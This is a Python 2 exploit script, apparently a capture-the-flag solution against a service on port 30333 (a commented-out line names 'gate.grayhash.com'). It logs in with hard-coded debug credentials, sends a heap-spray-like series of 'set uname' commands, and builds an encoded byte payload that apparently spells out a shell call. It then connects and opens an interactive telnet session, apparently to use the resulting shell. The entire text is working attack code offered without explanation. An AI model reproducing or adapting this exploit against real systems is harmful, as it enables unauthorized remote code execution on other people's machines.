import socket

stager = ''.join([chr(x) for x in [
    0x20, 0x20, 0xD1,
    0x20, 0x20, 0xD5,
    0x01,
    0xCE, 0xCE, 0xD8,
    0xCF, 0xCF, 0xDB,
    0xFE, 0xFE, 0xDE,
    0xF0, 0xF0, 0xE1,
    0xF3, 0xF3, 0xE4,
    0xF6, 0xF6, 0xE7,
    0xD4, 0xF0, 0xEA,
    0xD4, 0xF3, 0xED,
    0xD4, 0xF6, 0xF0,
    0x33, 0xCE, 0xF3,
    0x33, 0xCF, 0xF6,
    0x33, 0xFE, 0xF9,
    0x10, 0x10, 0xCE,
    0xCE, 0xCE, 0xCE,
]])
payload = "debug#login\nadmin!1234\n"
payload += "set uname " + stager + "\n"
payload += ("set uname " + "\xCE" * 160 + "\n") * 260

payload += "\x40\x40\x00"
payload += "\x41\x41\x00"
payload += "\xFE\x41\x98"
payload += "\x41\x40\x00"
for i in xrange(8):
    payload += "\x41\x41\x00"
    payload += "\x40\x41\x00"
    payload += "\x41\x40\x00"
payload += "\x41\x41\x00"
payload += "\xFE\x41\x96"
payload += "\x41\x40\x00"
for i in xrange(8):
    payload += "\x41\x41\x00"
    payload += "\x40\x41\x00"
    payload += "\x41\x40\x00"
payload += "\x41\x41\x00"
payload += "\xFE\x41\x80"
payload += "\x41\x40\x00"

payload += "\x42\x42\x00"
payload += "\x40\x42\x00"
payload += "\x41\x41\x00"
payload += "\xFE\x41\x02"
payload += "\x41\x42\x00"

payload += "\x43\x43\x00"
payload += "\x40\x43\x00"
payload += "\x41\x41\x00"
payload += "\xFE\x41\x01"
payload += "\x41\x43\x00"

payload += "\x44\x44\x00"
payload += "\x41\x41\x00"
payload += "\xFE\x41\x3B"
payload += "\x41\x44\x00"

payload += "\x45\x45\x00"
payload += "\x41\x41\x00"
payload += "\xFE\x41\x70"
payload += "\x41\x45\x00"

payload += "\x46\x46\x00"
payload += "\x41\x41\x00"
payload += "\xFE\x41\x03"
payload += "\x41\x46\x00"

payload += "\x70\x70\x00"
payload += "\x41\x41\x00"
payload += "\xFE\x41s"
payload += "\x41\x70\x00"
payload += "\x71\x71\x00"
payload += "\x41\x41\x00"
payload += "\xFE\x41h"
payload += "\x41\x71\x00"
payload += "\x72\x72\x00"

for i in xrange(6):
    a = 0x80 + i*6
    b = 0x81 + i*6
    c = 0x82 + i*6
    payload += chr(a) + chr(a) + "\x00"
    payload += "\x41\x41\x00"
    payload += "\xFE\x41\x45"
    payload += "\x41" + chr(a) + "\x00"
    payload += chr(b) + chr(b) + "\x00"
    payload += "\x41\x41\x00"
    payload += "\x42\x41\x00"
    payload += "\x41" + chr(b) + "\x00"
    payload += chr(c) + chr(c) + "\x00"

    a = 0x83 + i*6
    b = 0x84 + i*6
    c = 0x85 + i*6
    payload += chr(a) + chr(a) + "\x00"
    payload += "\x41\x41\x00"
    payload += "\xFE\x41\x46"
    payload += "\x41" + chr(a) + "\x00"
    payload += chr(b) + chr(b) + "\x00"
    payload += "\x41\x41\x00"
    payload += "\x42\x41\x00"
    payload += "\x41" + chr(b) + "\x00"
    payload += chr(c) + chr(c) + "\x00"

a = 0x80 + 6*6
b = 0x81 + 6*6
c = 0x82 + 6*6
payload += chr(a) + chr(a) + "\x00"
payload += "\x41\x41\x00"
payload += "\xFE\x41\x44"
payload += "\x41" + chr(a) + "\x00"
payload += chr(b) + chr(b) + "\x00"
payload += "\x41\x41\x00"
payload += "\x42\x41\x00"
payload += "\x41" + chr(b) + "\x00"
payload += chr(c) + chr(c) + "\x00"

a = 0x83 + 6*6
b = 0x84 + 6*6
c = 0x85 + 6*6
payload += chr(a) + chr(a) + "\x00"
payload += "\x41\x41\x00"
payload += "\x43\x41\x00"
payload += "\x41" + chr(a) + "\x00"
payload += chr(b) + chr(b) + "\x00"
payload += chr(c) + chr(c) + "\x00"

payload += "\xCB\xCB\x00"
payload += "\xCC\xCC\x00"
payload += "\xCD\xCD\x00"
payload += "\x41\x41\x00"
payload += "\xFE\x41\x80"
payload += "\x41\xCD\x00"
payload += "\xFE\xFB\x03"
payload += "\xFE\xFB\x03"

s = socket.create_connection(('localhost', 30333))
#s = socket.create_connection(('gate.grayhash.com', 30333))

s.send(payload)

import time
import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()

import sys
while True:
    buf = s.recv(1)
    if len(buf) == 0: break
    sys.stderr.write(buf)
